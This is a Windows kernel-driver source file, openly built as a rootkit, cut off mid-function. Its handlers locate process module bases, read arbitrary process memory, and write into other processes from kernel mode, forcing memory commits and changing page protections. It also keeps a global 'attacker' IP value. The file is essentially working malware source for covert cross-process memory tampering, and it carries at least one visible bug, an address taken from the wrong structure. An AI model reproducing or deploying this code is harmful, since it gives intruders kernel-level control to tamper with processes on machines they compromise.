#include "requests.h"
#pragma warning(disable:4996)
#pragma warning(disable:4302)
#pragma warning(disable:4311)


// Global variables:
ULONG AttackerAddressValue = 0;


ULONG ReturnAttackerIPAddress() {
	return AttackerAddressValue;
}


NTSTATUS GetModuleBaseRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable\n");
	ULONG NeededNameSize = 0;
	ULONG FinalSize = 0;
	PVOID NameBuffer = NULL;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	RKSYSTEM_INFORET ModuleBaseRet = { 0 };
	UNICODE_STRING ModuleName = { 0 };
	KAPC_STATE ProcessState = { 0 };
	HANDLE ProcessHandle = NULL;
	PEPROCESS Process;
	PLDR_DATA_TABLE_ENTRY PrcEntry = NULL;  // An LDR entry of each iterated process, used to compare names to find process module
	PPEB_LDR_DATA PrcLdr = NULL;  // LDR data of the process
	PPEB PrcPeb = NULL;  // Process Environent Block of the process, used to get the LDR data


	// Check for invalid arguments:
	if (RootkInst->MainPID == 0) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (invalid parameter: MainPID = 0)\n");
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Process EPROCESS:
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get EPROCESS of executable %llu)\n", RootkInst->MainPID);
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Get handle to process:
	Status = general_helpers::OpenProcessHandleADD(&ProcessHandle, RootkInst->MainPID);
	if (!NT_SUCCESS(Status) && Status != STATUS_INFO_LENGTH_MISMATCH) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get process handle of executable %llu: 0x%x)\n", RootkInst->MainPID, Status);
		RootkInst->Out = NULL;
		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Get initial size needed for name:
	Status = NtQueryProcess(ProcessHandle, ProcessImageFileName, NameBuffer, 0, &NeededNameSize);
	if (!NT_SUCCESS(Status) && Status != STATUS_INFO_LENGTH_MISMATCH) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get needed size for executable %llu image name buffer: 0x%x)\n", RootkInst->MainPID, Status);
		RootkInst->Out = NULL;
		ZwClose(ProcessHandle);
		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Allocate memory for UNICODE_STRING name:
	NameBuffer = ExAllocatePoolWithTag(NonPagedPool, NeededNameSize, 'RqIn');
	if (NameBuffer == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot allocate memory for executable %llu image name buffer)\n", RootkInst->MainPID);
		RootkInst->Out = NULL;
		ZwClose(ProcessHandle);
		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Get UNICODE_STRING name of process:
	Status = NtQueryProcess(ProcessHandle, ProcessImageFileName, NameBuffer, NeededNameSize, &FinalSize);
	if (!NT_SUCCESS(Status)) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get image name of executable %llu: 0x%x)\n", RootkInst->MainPID, Status);
		RootkInst->Out = NULL;
		ZwClose(ProcessHandle);
		ExFreePool(NameBuffer);
		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Get substring with process name instead of the full path:
	if (!NT_SUCCESS(general_helpers::CopyStringAfterCharADD((PUNICODE_STRING)NameBuffer, &ModuleName, L'\\'))) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get substring of name of executable %llu after \'\\\': 0x%x)\n", RootkInst->MainPID, Status);
		RootkInst->Out = NULL;
		ZwClose(ProcessHandle);
		ExFreePool(NameBuffer);
		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
	}
    ZwClose(ProcessHandle);
	ExFreePool(NameBuffer);


	// Get process PEB for the base address:
	PrcPeb = PsGetProcessPeb(Process);
	if (PrcPeb == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot get process PEB of executable %llu)\n", RootkInst->MainPID);
		RootkInst->Out = NULL;
		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCPEB, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Get LDR data to iterate through:
	KeStackAttachProcess(Process, &ProcessState);
	PrcLdr = (PPEB_LDR_DATA)PrcPeb->Ldr;
	if (!PrcLdr) {
		KeUnstackDetachProcess(&ProcessState);
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (LDR of executable %llu = NULL)\n", RootkInst->MainPID);
		RootkInst->Out = NULL;
		return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_PRCLOADMDLS, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Iterate the process module's loader data to find the right module:
	for (PLIST_ENTRY list = (PLIST_ENTRY)PrcLdr->ModuleListLoadOrder.Flink; list != &PrcLdr->ModuleListLoadOrder; list = (PLIST_ENTRY)list->Flink) {
		PrcEntry = CONTAINING_RECORD(list, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);
		if (general_helpers::CompareUnicodeStringsADD(&PrcEntry->BaseDllName, &ModuleName, 0)) {
			RootkInst->Out = PrcEntry->DllBase;
			KeUnstackDetachProcess(&ProcessState);
			DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable succeeded, module (%llu, %wZ) was found at base address = %p\n", RootkInst->MainPID, &ModuleName, RootkInst->Out);
			return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
		}
	}

	// The specified process module was not found:
	KeUnstackDetachProcess(&ProcessState);
	DbgPrintEx(0, 0, "KMDFdriver Requests - Get base address of executable failed (cannot find the base address of executable %llu in the LDR data)\n", RootkInst->MainPID);
	RootkInst->Out = NULL;
	return requests_helpers::ExitRootkitRequestADD(NULL, Process, ROOTKSTATUS_OTHER, STATUS_UNSUCCESSFUL, RootkInst);
}




NTSTATUS WriteToMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory\n");
	PEPROCESS EpTo;
	PEPROCESS EpFrom;
	KAPC_STATE DstState;
	KAPC_STATE SrcState;
	MEMORY_BASIC_INFORMATION ToInfo = { 0 };
	MEMORY_BASIC_INFORMATION FromInfo = { 0 };
	NTSTATUS Status;
	PVOID WriteToAddr = RootkInst->Out;
	PVOID WriteFromAddr = RootkInst->Buffer;
	ULONG64 WriteSize = RootkInst->Size;
	ULONG_PTR ZeroBits = (ULONG_PTR)RootkInst->Reserved;
	SIZE_T AllocSize = ((WriteSize / PAGE_SIZE) + 1) * PAGE_SIZE;
	ULONG OldState = 0;
	BOOL WasCommitted = FALSE;
	BOOL CopyAttach = FALSE;  // FALSE = DST, TRUE = SRC
	PVOID SourceBuffer = NULL;


	// Check for invalid arguments:
	if (RootkInst->Buffer == NULL || RootkInst->Out == NULL || RootkInst->Size == 0) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (one or more arguments are invalid: %p, %p, %zu)\n", RootkInst->Buffer, RootkInst->Out, RootkInst->Size);
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Destination EPROCESS:
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpTo))) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot get EPROCESS of destination process %llu)\n", RootkInst->MainPID);
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Source EPROCESS:
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpFrom))) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot get EPROCESS of source process %llu)\n", RootkInst->MainPID);
		return requests_helpers::ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Check if writing source can be read from (only when source = UM AND its not regular buffer, KM is always readable from here):
	if ((ULONG)RootkInst->Status != REGULAR_BUFFER){
		KeStackAttachProcess(EpFrom, &SrcState);
		__try {
			ProbeForRead(WriteFromAddr, AllocSize, sizeof(UCHAR));
			Status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteFromAddr, MemoryBasicInformation, &FromInfo, sizeof(FromInfo), NULL);
			KeUnstackDetachProcess(&SrcState);
			if (!NT_SUCCESS(Status)) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot query source memory for reading from process %llu)\n", RootkInst->SemiPID);
				return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
			}
		}

		__except (STATUS_ACCESS_VIOLATION) {
			KeUnstackDetachProcess(&SrcState);
			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (access violation system exception while reading memory from source process %llu)\n", RootkInst->SemiPID);
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);

		}

		if (!(FromInfo.State & MEM_COMMIT)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (source memory from process %llu is not committed in memory, cannot verify if can read)\n", RootkInst->SemiPID);
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
		}

		if (FromInfo.AllocationBase != WriteFromAddr && FromInfo.AllocationBase != NULL) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory, switched source memory read address from process %llu to %p from %p\n", RootkInst->SemiPID, FromInfo.AllocationBase, WriteFromAddr);
			WriteFromAddr = ToInfo.AllocationBase;
			RootkInst->Buffer = WriteFromAddr;
		}

		if (FromInfo.AllocationBase == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (allocation base of memory region in source process %llu = NULL)\n", RootkInst->SemiPID);
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
		}

		if (FromInfo.RegionSize < AllocSize) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (source memory range size %zu < required size to write %zu)\n", FromInfo.RegionSize, AllocSize);
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
		}
	}
	DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory, regular buffer/UM source to UM destination\n");


	// Check if writing destination can be written into:
	KeStackAttachProcess(EpTo, &DstState);
	__try {
		ProbeForRead(WriteToAddr, AllocSize, sizeof(UCHAR));
		Status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteToAddr, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);
	}
	__except (STATUS_ACCESS_VIOLATION) {
		KeUnstackDetachProcess(&DstState);
		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (access violation system error occured while querying destination memory)\n");
		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (!NT_SUCCESS(Status)) {
		KeUnstackDetachProcess(&DstState);
		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot query destination memory to verify if committed and can be written into)\n");
		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
	}


	OldState = ToInfo.State;
	if (((ULONG64)ToInfo.BaseAddress + ToInfo.RegionSize) < ((ULONG64)WriteToAddr + WriteSize)) {
		KeUnstackDetachProcess(&DstState);
		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (destination address + writing size do not match up with the base address + region size of the relevant memory region/s)\n");
		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (!(ToInfo.State & MEM_COMMIT)) {
		WriteToAddr = CommitMemoryRegionsADD(ZwCurrentProcess(), WriteToAddr, AllocSize, PAGE_READWRITE, ToInfo.AllocationBase, ZeroBits);
		if (WriteToAddr == NULL) {
			KeUnstackDetachProcess(&DstState);
			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (destination memory is not committed and/or is not possible to commit)\n");
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
		}
		WasCommitted = TRUE;
	}
	else {
		if (AllocSize <= ToInfo.RegionSize) {
			WriteToAddr = ToInfo.AllocationBase;
		}
		else {
			Status = ZwFreeVirtualMemory(ZwCurrentProcess(), &ToInfo.AllocationBase, &ToInfo.RegionSize, MEM_RELEASE);
			if (!NT_SUCCESS(Status)) {
				KeUnstackDetachProcess(&DstState);
				DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (destination memory is already committed with invalid attributes, cannot free it)\n");
				return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
			}

			WriteToAddr = CommitMemoryRegionsADD(ZwCurrentProcess(), WriteToAddr, AllocSize, PAGE_READWRITE, NULL, ZeroBits);
			if (WriteToAddr == NULL) {
				KeUnstackDetachProcess(&DstState);
				DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot commit memory in the relevant region of memory in destination process)\n");
				return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
			}
			WasCommitted = TRUE;
			OldState = MEM_COMMIT;
		}
	}
	KeUnstackDetachProcess(&DstState);
	RootkInst->Out = WriteToAddr;  // NOT INSIDE - C00..5 BECAUSE OF ATTACHING TO PROCESS


	// Query target address to check memory address range protection settings (access to memory):
	KeStackAttachProcess(EpTo, &DstState);
	Status = ZwQueryVirtualMemory(ZwCurrentProcess(), WriteToAddr, MemoryBasicInformation, &ToInfo, sizeof(ToInfo), NULL);
	if (!NT_SUCCESS(Status)) {
		KeUnstackDetachProcess(&DstState);
		if (WasCommitted) {
			memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}
		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (querying virtual memory of destination failed)\n");
		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
	}

	if (!(ToInfo.Protect & PAGE_EXECUTE_READWRITE || ToInfo.Protect & PAGE_READWRITE || ToInfo.Protect & PAGE_WRITECOPY || ToInfo.Protect & PAGE_EXECUTE_WRITECOPY) || ToInfo.Protect & PAGE_GUARD || ToInfo.Protect & PAGE_NOACCESS) {
		if (!ChangeProtectionSettingsADD(ZwCurrentProcess(), WriteToAddr, (ULONG)AllocSize, PAGE_READWRITE, ToInfo.Protect)) {
			KeUnstackDetachProcess(&DstState);
			if (WasCommitted) {
				memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
			}
			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (do not have write permissions into destination memory)\n");
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOWRITEPRMS, STATUS_UNSUCCESSFUL, RootkInst);
		}
	}
	KeUnstackDetachProcess(&DstState);


	// Copy virtual memory (provided buffer/u-u):
	__try {
		KeStackAttachProcess(EpTo, &DstState);
		ProbeForRead(WriteToAddr, AllocSize, sizeof(UCHAR));
		KeUnstackDetachProcess(&DstState);
		if (WriteFromAddr != NULL) {
			KeStackAttachProcess(EpFrom, &SrcState);
			CopyAttach = TRUE;
			ProbeForRead(WriteFromAddr, WriteSize, sizeof(UCHAR));
			KeUnstackDetachProcess(&SrcState);
		}
		CopyAttach = FALSE;
	}

	__except (STATUS_ACCESS_VIOLATION) {
		if (CopyAttach) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (access violation system exception in source process)\n");
			KeUnstackDetachProcess(&SrcState);
		}
		else {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (access violation system exception in destination process)\n");
			KeUnstackDetachProcess(&DstState);
		}
		if (WasCommitted) {
			memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}
		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);

	}


	// Get the source buffer into kernel mode:
	SourceBuffer = ExAllocatePoolWithTag(NonPagedPool, WriteSize, 'RqWs');
	if (SourceBuffer == NULL) {
		if (WasCommitted) {
			memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}
		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot allocate buffer for writing source)\n");
		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
	}

	Status = UserToKernelMEM(EpFrom, WriteFromAddr, SourceBuffer, WriteSize, FALSE);
	if (!NT_SUCCESS(Status)) {
		if (WasCommitted) {
			memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
		}
		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot copy writing source into buffer)\n");
		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Copying from UM-UM/REG-UM:
	Status = KernelToUserMEM(EpTo, SourceBuffer, WriteToAddr, WriteSize, FALSE);
	if (WasCommitted) {
		memory_helpers::FreeAllocatedMemoryADD(EpTo, OldState, WriteToAddr, AllocSize);
	}
	ExFreePool(SourceBuffer);

	if (!NT_SUCCESS(Status)) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory failed (cannot copy local KM source buffer into UM destination memory)\n");
		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
	}

	DbgPrintEx(0, 0, "KMDFdriver Requests - Write into process memory succeeded\n");
	return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}




NTSTATUS ReadFromMemoryRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory\n");
	PEPROCESS EpFrom;
	PEPROCESS EpTo;
	NTSTATUS status;
	KAPC_STATE SrcState;
	MEMORY_BASIC_INFORMATION FromInfo = { 0 };
	PVOID ReadToAddr = RootkInst->Out;
	PVOID ReadFromAddr = RootkInst->Buffer;
	ULONG64 ReadSize = RootkInst->Size;
	SIZE_T AllocSize = ((ReadSize / PAGE_SIZE) + 1) * PAGE_SIZE;
	PVOID SourceBuffer = NULL;


	// Check for invalid arguments:
	if (RootkInst->Buffer == NULL || RootkInst->Out == NULL || RootkInst->Size == 0) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (one or more parameters are invalid: %p, %p, %zu)\n", RootkInst->Buffer, RootkInst->Out, RootkInst->Size);
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_ADRBUFSIZE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Destination process EPROCESS:
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->SemiPID, &EpTo))) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot get destination process %llu EPROCESS)\n", RootkInst->SemiPID);
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}

	// Source process EPROCESS:
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &EpFrom))) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot get source process %llu EPROCESS)\n", RootkInst->MainPID);
		return requests_helpers::ExitRootkitRequestADD(NULL, EpTo, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Verify the source address and the memory region:
	__try {
		KeStackAttachProcess(EpFrom, &SrcState);
		ProbeForRead(ReadFromAddr, AllocSize, sizeof(UCHAR));
		status = ZwQueryVirtualMemory(ZwCurrentProcess(), ReadFromAddr, MemoryBasicInformation, &FromInfo, sizeof(FromInfo), NULL);
		if (!NT_SUCCESS(status)) {
			KeUnstackDetachProcess(&SrcState);
			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot query source memory from process %llu to verify if can read)\n", RootkInst->MainPID);
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_QUERYVIRTMEM, STATUS_UNSUCCESSFUL, RootkInst);
		}
		KeUnstackDetachProcess(&SrcState);
		if (!(FromInfo.State & MEM_COMMIT)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (source memory region from process %llu is not committed, nothing to read)\n", RootkInst->MainPID);
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTCOMMITTED, STATUS_UNSUCCESSFUL, RootkInst);
		}


		// If reading parameters are out of range - use allocation base:
		if ((ULONG64)ReadFromAddr + ReadSize > (ULONG64)FromInfo.AllocationBase + FromInfo.RegionSize) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory, changing reading address from %p to %p (original address + size is out of range)\n", ReadFromAddr, FromInfo.AllocationBase);
			ReadFromAddr = FromInfo.AllocationBase;
		}
		RootkInst->Buffer = ReadFromAddr;
		if (FromInfo.RegionSize < AllocSize) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (source memory region size %zu < requested size %zu)\n", FromInfo.RegionSize, AllocSize);
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_LESSTHNREQ, STATUS_UNSUCCESSFUL, RootkInst);
		}


		// Allocate source buffer:
		SourceBuffer = ExAllocatePoolWithTag(NonPagedPool, ReadSize, 'RqRs');
		if (SourceBuffer == NULL) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot allocate memory for KM source buffer)\n");
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
		}


		// Get source buffer:
		status = UserToKernelMEM(EpFrom, ReadFromAddr, SourceBuffer, ReadSize, FALSE);
		if (!NT_SUCCESS(status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot copy into source buffer from source memory)\n");
			ExFreePool(SourceBuffer);
			return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
		}
	}
	__except (STATUS_ACCESS_VIOLATION) {
		KeUnstackDetachProcess(&SrcState);
		if (SourceBuffer != NULL) {
			ExFreePool(SourceBuffer);
		}
		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (access violation system exception when querying source memory region/s)\n");
		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_NOTINRELRANGE, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Copy from local KM buffer to the destination UM buffer:
	status = KernelToUserMEM(EpTo, SourceBuffer, ReadToAddr, ReadSize, FALSE);
	ExFreePool(SourceBuffer);
	if (!NT_SUCCESS(status)) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory failed (cannot copy source KM buffer into destination memory region/s)\n");
		return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_COPYFAIL, STATUS_UNSUCCESSFUL, RootkInst);
	}
	DbgPrintEx(0, 0, "KMDFdriver Requests - Reading from process memory succeeded\n");
	return requests_helpers::ExitRootkitRequestADD(EpFrom, EpTo, ROOTKSTATUS_SUCCESS, STATUS_SUCCESS, RootkInst);
}




NTSTATUS RetrieveSystemInformationRK(ROOTKIT_MEMORY* RootkInst) {
	DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information\n");
	PEPROCESS Process = { 0 };
	RKSYSTEM_INFORET SysInfoRet = { 0 };
	KAPC_STATE PrcState = { 0 };
	RKSYSTEM_INFORMATION_CLASS CurrInf = { SystemBasicInformation, NULL, ROOTKSTATUS_QUERYSYSINFO, NULL };
	ULONG64 TotalRequests = (RootkInst->Size / sizeof(RKSYSTEM_INFORMATION_CLASS));
	SIZE_T InfoSize = 0;
	ULONG64 InfoOffs = 0;
	NTSTATUS Status = STATUS_UNSUCCESSFUL;
	PVOID LocalSysinf = NULL;
	PVOID PrcInf = NULL;
	

	// Check for invalid arguments:
	if (RootkInst->MainPID == 0 || RootkInst->Buffer == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (one or more invalid arguments: %llu, %p)\n", RootkInst->MainPID, RootkInst->Buffer);
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_INVARGS, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Process EPROCESS:
	if (!NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)RootkInst->MainPID, &Process))) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (cannot get medium EPROCESS)\n");
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_PROCESSEPRC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Iterate through the system info requests for part 1 (get each infotype from types buffer, query for system information and save the results in the original buffer):
	for (ULONG64 AttrOffs = 0; AttrOffs < TotalRequests * sizeof(CurrInf); AttrOffs += sizeof(CurrInf)) {
		Status = UserToKernelMEM(Process, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), &CurrInf, sizeof(CurrInf), FALSE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu failed (cannot get attributes of request)\n", AttrOffs / sizeof(CurrInf));
			CurrInf.InfoSize = 0;
			CurrInf.PoolBuffer = NULL;
			CurrInf.ReturnStatus = ROOTKSTATUS_COPYFAIL;
		}
		else {
			SysInfoRet = requests_helpers::RequestSystemInfoADD(CurrInf.InfoType, (ULONG64)CurrInf.ReturnStatus);
			CurrInf.PoolBuffer = SysInfoRet.Buffer;  // NULL = function failed, non-NULL = function succeeded
			CurrInf.InfoSize = (ULONG)SysInfoRet.BufferSize;  // 0 = function failed, >0 = function succeeded

			if (SysInfoRet.Buffer == NULL && SysInfoRet.BufferSize == 0) {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu failed (system information request returned NULL for the pool pointer - failed)\n", AttrOffs / sizeof(CurrInf));
				CurrInf.ReturnStatus = ROOTKSTATUS_QUERYSYSINFO;
			}
			else {
				DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu succeeded\n", AttrOffs / sizeof(CurrInf));
				CurrInf.ReturnStatus = ROOTKSTATUS_SUCCESS;
				InfoSize += CurrInf.InfoSize;
			}
		}
		Status = KernelToUserMEM(Process, &CurrInf, (PVOID)((ULONG64)RootkInst->Buffer + AttrOffs), sizeof(CurrInf), FALSE);
		if (!NT_SUCCESS(Status)) {
			DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information request %llu failed to return operation results for ther request\n", AttrOffs / sizeof(CurrInf));
		}
	}


	// Allocate local system info buffer:
	LocalSysinf = ExAllocatePoolWithTag(NonPagedPool, InfoSize, 'RqSi');
	if (!LocalSysinf) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (cannot allocate memory for local information buffer)\n");
		return requests_helpers::ExitRootkitRequestADD(NULL, NULL, ROOTKSTATUS_MEMALLOC, STATUS_UNSUCCESSFUL, RootkInst);
	}


	// Allocate system information buffer in process:
	KeStackAttachProcess(Process, &PrcState);
	PrcInf = memory_helpers::AllocateMemoryADD(NULL, ((InfoSize / PAGE_SIZE) + 1) * PAGE_SIZE, &PrcState, 0);
	if (PrcInf == NULL) {
		DbgPrintEx(0, 0, "KMDFdriver Requests - Get system information failed (cannot allocate memory for information in medium process)\n");
		ExFreePool(LocalSysinf);
